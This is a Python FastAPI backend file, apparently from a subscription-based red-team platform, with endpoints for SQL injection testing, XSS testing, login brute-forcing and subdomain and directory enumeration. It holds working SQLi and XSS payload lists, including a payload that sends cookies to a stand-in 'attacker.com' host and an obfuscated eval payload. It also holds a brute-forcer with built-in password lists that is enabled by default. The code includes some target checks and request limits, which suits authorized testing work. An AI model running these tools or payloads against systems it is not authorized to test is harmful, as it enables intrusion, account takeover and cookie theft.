"""
Red Team Tools Routes
Ferramentas de Red Team para pentesting
AVISO: Uso apenas para fins educacionais e testes autorizados
"""

from fastapi import APIRouter, HTTPException, Depends, UploadFile, File
from pydantic import BaseModel, HttpUrl, validator
from typing import List, Optional, Dict, Any
from sqlalchemy.orm import Session
import re
import hashlib
from datetime import datetime
import logging
import json
import os
import socket
import time
import uuid
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import requests

from database import get_db
from auth import get_current_user
from models.user import User
from models.scan import Scan
from middleware.subscription import check_subscription_status, check_tool_access

# Configurar logger
logger = logging.getLogger(__name__)

router = APIRouter(prefix="/redteam", tags=["Red Team"])

HTTP_TIMEOUT = (3.05, 10)
MAX_ACTIVE_TESTS = 100
BRUTE_FORCE_MAX_ATTEMPTS = int(os.getenv("REDTEAM_BRUTE_FORCE_MAX_ATTEMPTS", "10000"))

BUILTIN_PASSWORD_SEEDS = [
    "123456", "password", "123456789", "12345678", "qwerty", "abc123", "111111",
    "123123", "admin", "letmein", "welcome", "monkey", "dragon", "master", "login",
    "passw0rd", "iloveyou", " sunshine", "princess", "football", "baseball", "shadow",
    "superman", "trustno1", "whatever", "freedom", "hello", "charlie", "donald",
    "access", "secret", "test", "guest", "root", "toor", "changeme", "P@ssw0rd"
]


def _builtin_passwords(kind: str) -> List[str]:
    """Return deterministic built-in candidates; counts are reported to the UI."""
    if kind == "common":
        return list(dict.fromkeys(BUILTIN_PASSWORD_SEEDS))
    target = 1000 if kind == "medium" else 5000
    values = list(dict.fromkeys(BUILTIN_PASSWORD_SEEDS))
    for seed in BUILTIN_PASSWORD_SEEDS:
        for suffix in [str(i) for i in range(0, 10000)]:
            if len(values) >= target:
                return values
            candidate = f"{seed}{suffix}"
            if candidate not in values:
                values.append(candidate)
    return values


def _validate_scan_target(value: str) -> None:
    """Reject ambiguous/unsafe targets before making an outbound request."""
    parsed = urlparse(value)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise HTTPException(status_code=400, detail="Alvo HTTP(S) inválido")
    host = parsed.hostname.lower().rstrip(".")
    allowed = {h.strip().lower() for h in os.getenv("REDTEAM_ALLOWED_HOSTS", "").split(",") if h.strip()}
    if allowed and host not in allowed:
        raise HTTPException(status_code=403, detail="Alvo fora da allowlist REDTEAM_ALLOWED_HOSTS")
    if not allowed and os.getenv("REDTEAM_ALLOW_PRIVATE_TARGETS", "false").lower() != "true":
        try:
            addresses = {item[4][0] for item in socket.getaddrinfo(host, None)}
            for address in addresses:
                ip = __import__("ipaddress").ip_address(address)
                if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
                    raise HTTPException(status_code=403, detail="Alvo privado exige REDTEAM_ALLOW_PRIVATE_TARGETS=true")
        except socket.gaierror:
            raise HTTPException(status_code=400, detail="Não foi possível resolver o alvo")


def _request_with_param(url: str, parameter: str, value: str, method: str = "GET"):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    params[parameter] = value
    target = urlunparse(parsed._replace(query=urlencode(params)))
    if method.upper() == "POST":
        return requests.post(urlunparse(parsed._replace(query="")), data=params,
                             timeout=HTTP_TIMEOUT, allow_redirects=False,
                             headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})
    return requests.get(target, timeout=HTTP_TIMEOUT, allow_redirects=False,
                        headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})

# ==================== MODELS ====================

class SQLiTestRequest(BaseModel):
    url: str
    method: str = "GET"
    parameters: List[str]
    payload_type: str = "basic"
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('parameters')
    def validate_parameters(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Pelo menos um parâmetro deve ser fornecido')
        return [p.strip() for p in v if p.strip()]
    
    @validator('payload_type')
    def validate_payload_type(cls, v):
        valid_types = ['basic', 'union', 'blind', 'time', 'all']
        if v not in valid_types:
            raise ValueError(f'Tipo de payload inválido. Use: {", ".join(valid_types)}')
        return v

class XSSTestRequest(BaseModel):
    url: str
    parameters: List[str]
    payload_type: str = "reflected"
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('parameters')
    def validate_parameters(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Pelo menos um parâmetro deve ser fornecido')
        return [p.strip() for p in v if p.strip()]
    
    @validator('payload_type')
    def validate_payload_type(cls, v):
        valid_types = ['reflected', 'stored', 'dom', 'all']
        if v not in valid_types:
            raise ValueError(f'Tipo de payload inválido. Use: {", ".join(valid_types)}')
        return v

class BruteForceRequest(BaseModel):
    url: str
    user_field: str = "username"
    pass_field: str = "password"
    userlist: List[str]
    wordlist: str = "common"
    custom_wordlist: List[str] = []
    wordlist_id: Optional[str] = None
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('userlist')
    def validate_userlist(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Lista de usuários não pode estar vazia')
        return [u.strip() for u in v if u.strip()]
    
    @validator('wordlist')
    def validate_wordlist(cls, v):
        valid_wordlists = ['common', 'medium', 'large', 'custom']
        if v not in valid_wordlists:
            raise ValueError(f'Wordlist inválida. Use: {", ".join(valid_wordlists)}')
        return v

    @validator('custom_wordlist')
    def validate_custom_wordlist(cls, v):
        cleaned = list(dict.fromkeys(item.strip() for item in (v or []) if item and item.strip()))
        if BRUTE_FORCE_MAX_ATTEMPTS and len(cleaned) > BRUTE_FORCE_MAX_ATTEMPTS:
            raise ValueError(f'Wordlist custom excede o limite configurado de {BRUTE_FORCE_MAX_ATTEMPTS} entradas')
        if any(len(item) > 256 for item in cleaned):
            raise ValueError('Cada entrada da wordlist deve ter no máximo 256 caracteres')
        return cleaned

class SubdomainEnumRequest(BaseModel):
    domain: str
    method: str = "dns"
    wordlist_size: str = "medium"
    
    @validator('domain')
    def validate_domain(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('Domínio não pode estar vazio')
        # Remove protocolo se presente
        v = v.strip().replace('http://', '').replace('https://', '').replace('www.', '')
        # Valida formato básico de domínio
        if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', v):
            raise ValueError('Formato de domínio inválido')
        return v
    
    @validator('method')
    def validate_method(cls, v):
        valid_methods = ['dns', 'certificate', 'api']
        if v not in valid_methods:
            raise ValueError(f'Método inválido. Use: {", ".join(valid_methods)}')
        return v
    
    @validator('wordlist_size')
    def validate_wordlist(cls, v):
        valid_sizes = ['small', 'medium', 'large']
        if v not in valid_sizes:
            raise ValueError(f'Tamanho de wordlist inválido. Use: {", ".join(valid_sizes)}')
        return v

class DirectoryEnumRequest(BaseModel):
    base_url: HttpUrl
    wordlist_size: str = "medium"
    status_filter: List[int] = []
    
    @validator('wordlist_size')
    def validate_wordlist_size(cls, v):
        valid_sizes = ['small', 'medium', 'large']
        if v not in valid_sizes:
            raise ValueError(f'Tamanho de wordlist inválido. Use: {", ".join(valid_sizes)}')
        return v
    
    @validator('status_filter')
    def validate_status_filter(cls, v):
        if v is None:
            return []
        cleaned = []
        for s in v:
            try:
                n = int(s)
                if 100 <= n <= 599:
                    cleaned.append(n)
            except Exception:
                continue
        return cleaned

# ==================== SQL INJECTION TESTER ====================

@router.post("/sqli/test")
async def test_sql_injection(
    request: SQLiTestRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Testa SQL Injection em uma URL
    AVISO: Use apenas em aplicações que você tem permissão para testar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("sqli_tester", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "sqli_tester",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"SQL Injection test started for URL: {request.url}")
        _validate_scan_target(request.url)
        
        # Payloads básicos de SQLi
        payloads = {
            "basic": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
            ],
            "union": [
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            "blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM users) > 0--",
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
            ]
        }
        
        results = []
        payload_list = payloads.get(request.payload_type, payloads["basic"])
        
        if request.payload_type == "all":
            payload_list = []
            for p in payloads.values():
                payload_list.extend(p)
        
        if len(request.parameters) * len(payload_list) > MAX_ACTIVE_TESTS:
            raise HTTPException(status_code=400, detail=f"Teste excede o limite seguro de {MAX_ACTIVE_TESTS} requisições")
        baseline = requests.get(request.url, timeout=HTTP_TIMEOUT, allow_redirects=False,
                                headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})
        error_markers = ("sql syntax", "mysql", "postgresql", "sqlite", "odbc", "ora-")
        for param in request.parameters:
            for payload in payload_list:
                started = time.monotonic()
                try:
                    response = _request_with_param(request.url, param, payload, request.method)
                    body = response.text[:1_000_000].lower()
                    error_based = any(marker in body for marker in error_markers)
                    # Positive result requires observed server evidence, never the payload itself.
                    result = {
                        "parameter": param, "payload": payload, "url": response.url,
                        "vulnerable": error_based,
                        "response_time": round(time.monotonic() - started, 3),
                        "status_code": response.status_code, "error_based": error_based,
                        "blind_detected": False,
                        "evidence": "database error marker in response" if error_based else None
                    }
                except requests.RequestException as exc:
                    result = {"parameter": param, "payload": payload, "url": request.url,
                              "vulnerable": False, "error": str(exc), "evidence": None}
                results.append(result)
        
        vulnerable_count = sum(1 for r in results if r["vulnerable"])
        
        logger.info(f"SQL Injection test completed. Vulnerabilities found: {vulnerable_count}")
        
        # Preparar resposta
        response_data = {
            "status": "completed",
            "url": request.url,
            "method": request.method,
            "parameters_tested": len(request.parameters),
            "payloads_tested": len(payload_list),
            "vulnerabilities_found": vulnerable_count,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        # Salvar no banco de dados
        scan = Scan(
            user_id=current_user.id,
            scan_type="sqli",
            target=request.url,
            status="completed",
            results=json.dumps(response_data),
            completed_at=datetime.utcnow()
        )
        db.add(scan)
        db.commit()
        db.refresh(scan)
        
        # Adicionar scan_id à resposta
        response_data["target"] = request.url
        response_data["scan_id"] = scan.id
        
        return response_data
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in SQL Injection test: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar teste: {str(e)}")

# ==================== XSS TESTER ====================

@router.post("/xss/test")
async def test_xss(
    request: XSSTestRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Testa vulnerabilidades XSS
    AVISO: Use apenas em aplicações que você tem permissão para testar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("xss_tester", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "xss_tester",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"XSS test started for URL: {request.url}")
        _validate_scan_target(request.url)
        
        payloads = {
            "reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
            ],
            "stored": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
                "<body onload=alert('XSS')>",
            ],
            "dom": [
                "#<script>alert('XSS')</script>",
                "javascript:void(document.cookie='XSS')",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            ]
        }
        
        results = []
        payload_list = payloads.get(request.payload_type, payloads["reflected"])
        
        if request.payload_type == "all":
            payload_list = []
            for p in payloads.values():
                payload_list.extend(p)
        
        if len(request.parameters) * len(payload_list) > MAX_ACTIVE_TESTS:
            raise HTTPException(status_code=400, detail=f"Teste excede o limite seguro de {MAX_ACTIVE_TESTS} requisições")
        for param in request.parameters:
            for payload in payload_list:
                try:
                    response = _request_with_param(request.url, param, payload)
                    body = response.text[:1_000_000]
                    reflected = payload in body
                    results.append({"parameter": param, "payload": payload, "url": response.url,
                                    "vulnerable": reflected, "type": request.payload_type,
                                    "severity": "high" if reflected else "low",
                                    "status_code": response.status_code,
                                    "evidence": "payload reflected verbatim in response" if reflected else None})
                except requests.RequestException as exc:
                    results.append({"parameter": param, "payload": payload, "url": request.url,
                                    "vulnerable": False, "type": request.payload_type,
                                    "severity": "low", "error": str(exc), "evidence": None})
        
        vulnerable_count = sum(1 for r in results if r["vulnerable"])
        
        logger.info(f"XSS test completed. Vulnerabilities found: {vulnerable_count}")
        
        # Preparar resposta
        response_data = {
            "status": "completed",
            "url": request.url,
            "parameters_tested": len(request.parameters),
            "payloads_tested": len(payload_list),
            "vulnerabilities_found": vulnerable_count,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        # Salvar no banco de dados
        scan = Scan(
            user_id=current_user.id,
            scan_type="xss",
            target=request.url,
            status="completed",
            results=json.dumps(response_data),
            completed_at=datetime.utcnow()
        )
        db.add(scan)
        db.commit()
        db.refresh(scan)
        
        # Adicionar scan_id à resposta
        response_data["target"] = request.url
        response_data["scan_id"] = scan.id
        
        return response_data
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in XSS test: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar teste: {str(e)}")

# ==================== BRUTE FORCE TOOL ====================

@router.get("/bruteforce/wordlists", tags=["Red Team"])
async def list_brute_force_wordlists(current_user: User = Depends(get_current_user)):
    """Expose the actual built-in wordlist sizes used by the auditor."""
    if not check_tool_access("password_auditor", current_user):
        raise HTTPException(status_code=403, detail="Esta ferramenta não está disponível no seu plano atual")
    return {
        "wordlists": [
            {"name": name, "count": len(_builtin_passwords(name)), "source": "built-in"}
            for name in ("common", "medium", "large")
        ],
        "custom": {"source": "upload", "max_entries": BRUTE_FORCE_MAX_ATTEMPTS or "configured_limit"}
    }

@router.post("/bruteforce/wordlist", tags=["Red Team"])
async def upload_brute_force_wordlist(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_user)
):
    """Valida uma wordlist enviada pelo usuário sem persistir seu conteúdo."""
    if not check_tool_access("password_auditor", current_user):
        raise HTTPException(status_code=403, detail="Esta ferramenta não está disponível no seu plano atual")
    if not file.filename or not file.filename.lower().endswith((".txt", ".list", ".lst")):
        raise HTTPException(status_code=400, detail="Envie uma wordlist .txt, .list ou .lst")
    content = await file.read()
    if len(content) > 2 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="Wordlist muito grande (máximo 2 MB)")
    try:
        text = content.decode("utf-8-sig")
    except UnicodeDecodeError:
        raise HTTPException(status_code=400, detail="A wordlist deve estar codificada em UTF-8")
    entries = list(dict.fromkeys(line.strip() for line in text.splitlines() if line.strip()))
    if not entries:
        raise HTTPException(status_code=400, detail="A wordlist está vazia")
    if BRUTE_FORCE_MAX_ATTEMPTS and len(entries) > BRUTE_FORCE_MAX_ATTEMPTS:
        raise HTTPException(status_code=400, detail=f"Wordlist excede o limite configurado de {BRUTE_FORCE_MAX_ATTEMPTS} entradas")
    if any("\x00" in item or len(item) > 256 for item in entries):
        raise HTTPException(status_code=400, detail="Entrada inválida: máximo de 256 caracteres e sem bytes nulos")
    wordlist_id = uuid.uuid4().hex
    storage_dir = os.path.join("/tmp", "ironnet_bruteforce_wordlists", str(current_user.id))
    os.makedirs(storage_dir, mode=0o700, exist_ok=True)
    storage_path = os.path.join(storage_dir, f"{wordlist_id}.txt")
    with open(storage_path, "w", encoding="utf-8") as stored:
        stored.write("\n".join(entries))
    return {"status": "validated", "filename": file.filename, "count": len(entries), "wordlist_id": wordlist_id}

@router.post("/bruteforce/start")
async def start_brute_force(
    request: BruteForceRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Executa auditoria de autenticação somente quando explicitamente habilitada.
    AVISO: Use apenas em ambientes de teste autorizados
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("password_auditor", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "password_auditor",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"Brute force test started for URL: {request.url}")
        _validate_scan_target(request.url)
        # Habilitado por padrão para instalações autenticadas; pode ser desligado explicitamente.
        if os.getenv("REDTEAM_ENABLE_BRUTE_FORCE", "true").lower() != "true":
            raise HTTPException(status_code=403, detail={
                "error": "bruteforce_disabled",
                "message": "Auditoria de credenciais desabilitada por segurança.",
                "action": "Defina REDTEAM_ENABLE_BRUTE_FORCE=true no ambiente do backend somente após autorizar o alvo.",
                "limits": {"max_attempts": MAX_ACTIVE_TESTS, "redirects": False}
            })
        
        # Listas pequenas e determinísticas; o limite de tentativas é obrigatório.
        wordlists = {name: _builtin_passwords(name) for name in ("common", "medium", "large")}
        if request.wordlist == "custom":
            if request.wordlist_id:
                if not re.fullmatch(r"[0-9a-f]{32}", request.wordlist_id):
                    raise HTTPException(status_code=400, detail="Identificador de wordlist inválido")
                wordlist_path = os.path.join("/tmp", "ironnet_bruteforce_wordlists", str(current_user.id), f"{request.wordlist_id}.txt")
                try:
                    with open(wordlist_path, encoding="utf-8") as stored:
                        passwords = [line.strip() for line in stored if line.strip()]
                except OSError:
                    raise HTTPException(status_code=400, detail="Wordlist enviada não encontrada ou expirada")
            elif request.custom_wordlist:
                passwords = request.custom_wordlist
            else:
                raise HTTPException(status_code=400, detail="Envie uma wordlist custom antes de iniciar")
        else:
            passwords = wordlists.get(request.wordlist, wordlists["common"])
        
        results = {
            "status": "completed",
            "url": request.url,
            "wordlist": request.wordlist,
            "wordlist_count": len(passwords),
            "total_attempts": len(request.userlist) * len(passwords),
            "successful_attempts": 0,
            "credentials_found": [],
            "attempts": [],
            "failed_attempts": 0,
            "request_errors": 0,
            "progress": 100,
            "timestamp": datetime.now().isoformat()
        }
        
        if BRUTE_FORCE_MAX_ATTEMPTS and len(request.userlist) * len(passwords) > BRUTE_FORCE_MAX_ATTEMPTS:
            raise HTTPException(status_code=400, detail=f"Auditoria excede o limite configurado de {BRUTE_FORCE_MAX_ATTEMPTS} tentativas. Ajuste REDTEAM_BRUTE_FORCE_MAX_ATTEMPTS no backend.")
        for user in request.userlist:
            for password in passwords:
                try:
                    response = requests.post(request.url, data={request.user_field: user, request.pass_field: password},
                                              timeout=HTTP_TIMEOUT, allow_redirects=False,
                                              headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})
                    # Success is reported only when the server's response is different from a failed login.
                    failure = response.status_code in {401, 403} or any(marker in response.text.lower() for marker in ("invalid", "incorrect", "failed", "unauthorized"))
                    positive = not failure and response.status_code < 400
                    attempt = {"username": user, "password": password, "positive": positive,
                               "status": "valid" if positive else "invalid",
                               "status_code": response.status_code}
                    if positive:
                        attempt["password"] = password
                        results["credentials_found"].append({"username": user, "password": password,
                                                              "status": "valid", "positive": True,
                                                              "status_code": response.status_code})
                        results["successful_attempts"] += 1
                    else:
                        results["failed_attempts"] += 1
                    results["attempts"].append(attempt)
                except requests.RequestException:
                    results["request_errors"] += 1
                    results["attempts"].append({"username": user, "positive": False,
                                                "status": "error", "status_code": None})
        
        logger.info(f"Brute force completed. Credentials found: {results['successful_attempts']}")
        
        return results
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in brute force: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar brute force: {str(e)}")

# ==================== SUBDOMAIN ENUMERATION ====================

@router.post("/subdomain/enumerate")
async def enumerate_subdomains(
    request: SubdomainEnumRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Enumera subdomínios de um domínio
    AVISO: Use apenas em domínios que você tem permissão para enumerar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("subdomain_finder", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "subdomain_finder",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"Subdomain enumeration started for domain: {request.domain}")
        
        # Subdomínios comuns para teste
        wordlist_sizes = {
            "small": 10,
            "medium": 20,
            "large": 50
        }
        
        common_subdomains = [
            "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2",
            "admin", "blog", "forum", "shop", "store", "dev", "staging",
            "api", "cdn", "vpn", "remote", "portal", "dashboard", "app",
            "test", "beta", "demo", "support", "help", "docs", "wiki",
            "git", "jenkins", "gitlab", "jira", "confluence", "monitoring",
            "backup", "db", "database", "mysql", "postgres", "redis",
            "proxy", "gateway", "firewall", "router", "switch", "server",
            "cloud", "aws", "azure", "gcp", "docker", "kubernetes"
        ]
        
        limit = wordlist_sizes.get(request.wordlist_size, 20)
        results = []
        
        for subdomain in common_subdomains[:limit]:
            full_domain = f"{subdomain}.{request.domain}"
            try:
                addresses = sorted({item[4][0] for item in socket.getaddrinfo(full_domain, 443)})
                item = {"subdomain": full_domain, "ip": addresses[0] if addresses else None,
                        "status": "resolved", "method": request.method}
                try:
                    response = requests.get(f"https://{full_domain}", timeout=HTTP_TIMEOUT,
                                            allow_redirects=False, headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})
                    item.update({"http_status": response.status_code, "server": response.headers.get("Server")})
                except requests.RequestException as exc:
                    item["http_error"] = str(exc)
                results.append(item)
            except socket.gaierror:
                continue
        
        logger.info(f"Subdomain enumeration completed. Found: {len(results)}")
        
        return {
            "status": "completed",
            "domain": request.domain,
            "method": request.method,
            "wordlist_size": request.wordlist_size,
            "subdomains_found": len(results),
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in subdomain enumeration: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao enumerar subdomínios: {str(e)}")

# ==================== DIRECTORY ENUMERATION ====================

@router.post("/directory/enumerate")
async def enumerate_directories(
    request: DirectoryEnumRequest,
    current_user: User = Depends(get_current_user)
):
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("directory_enumerator", current_user):
            if not getattr(current_user, "is_admin", False):
                raise HTTPException(
                    status_code=403,
                    detail={
                        "error": "tool_locked",
                        "message": "Esta ferramenta não está disponível no seu plano atual",
                        "tool": "directory_enumerator",
                        "current_plan": current_user.subscription_plan,
                        "upgrade_url": "/pricing"
                    }
                )
        logger.info(f"Directory enumeration started for base URL: {request.base_url}")
        
        wordlist_sizes = {
            "small": 10,
            "medium": 20,
            "large": 50
        }
        
        common_paths = [
            "admin", "login", "assets", "images", "css", "js", "uploads", "static",
            "api", "backup", "config", "server-status", "dashboard", "portal", "docs",
            "download", "tmp", "private", "include", "bin", "cgi-bin", "wp-admin",
            "wp-content", "wp-includes", "vendor", "node_modules", "build", "dist",
            "logs", "phpmyadmin"
        ]
        
        limit = wordlist_sizes.get(request.wordlist_size, 20)
        results = []
        base = str(request.base_url).rstrip('/')
        
        for path in common_paths[:limit]:
            url = f"{base}/{path}"
            try:
                response = requests.get(url, timeout=HTTP_TIMEOUT, allow_redirects=False,
                                        headers={"User-Agent": "IronAI-Authorized-Scanner/1.0"})
            except requests.RequestException as exc:
                continue
            status_code = response.status_code
            
            if request.status_filter and status_code not in request.status_filter:
                continue
            
            length = len(response.content)
            fingerprint = hashlib.sha256(response.content).hexdigest()[:12]
            results.append({
                "path": f"/{path}",
                "status_code": status_code,
                "length": length,
                "fingerprint": fingerprint,
                "content_type": response.headers.get("Content-Type"),
                "redirect": response.headers.get("Location")
            })
        
        logger.info(f"Directory enumeration completed. Found: {len(results)}")
        
        return {
            "status": "completed",
            "base_url": request.base_url,
            "wordlist_size": request.wordlist_size,
            "dirs_found": len(results),
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
    except HTTPException as e:
        raise e
    except Exception as e:
        logger.error(f"Error in directory enumeration: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao enumerar diretórios: {str(e)}")
